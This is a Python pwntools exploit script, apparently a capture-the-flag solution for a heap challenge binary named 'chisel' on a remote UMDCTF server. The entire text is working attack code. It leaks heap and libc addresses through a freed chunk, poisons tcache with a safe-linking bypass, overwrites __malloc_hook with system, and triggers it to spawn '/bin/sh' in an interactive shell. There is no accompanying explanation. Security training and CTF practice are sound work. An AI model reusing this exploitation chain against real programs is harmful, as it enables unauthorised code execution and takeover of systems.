from pwn import *
from icecream import ic
import tty

# Set up pwntools for the correct architecture
exe = "./chisel"
libc = ELF("./libc.so.6")
context.binary = elf = ELF(exe)
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote("challs.umdctf.io", 31447)
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
    c
'''.format(**locals())

# Useful macros
def sl(a): return r.sendline(a)
def s(a): return r.send(a)
def sa(a, b): return r.sendafter(a, b)
def sla(a, b): return r.sendlineafter(a, b)
def re(a): return r.recv(a)
def ru(a): return r.recvuntil(a)
def rl(): return r.recvline()
def i(): return r.interactive()
eof = chr(tty.CEOF)

def add(siz):
    sla(b"> ", b"1")
    sla(b"size: ", str(siz).encode())

def free():
    sla(b"> ", b"2")

def edit(val):
    sla(b"> ", b"3")
    sla(b"data: ", val)

def print():
    sla(b"> ", b"4")

def chis():
    sla(b"> ", b"5")

def enc(val):
    return val ^ heap

r = start()

# heap leak
add(0x20)
free()
print()
ru(b"data: ")
heap = int(rl().strip())
ic(hex(heap))

# Libc leak
add(0x418)
chis()
free()
print()
ru(b"data: ")
libc.address = int(rl().strip()) - 0x1e0c00
ic(hex(libc.address))

# tcache stashing
for i in range(7):
    add(0x518)
    chis()
    free()
    add(0x4e8) 
add(0x28)
add(0x28)

# tcache poisoning
free()
heap += 1 # allocation in next page
edit(str(enc(libc.sym.__malloc_hook)).encode())

add(0x28)
add(0x28)

edit(str(libc.sym.system).encode())
add(str(next(libc.search(b"/bin/sh\0"))))

r.interactive()
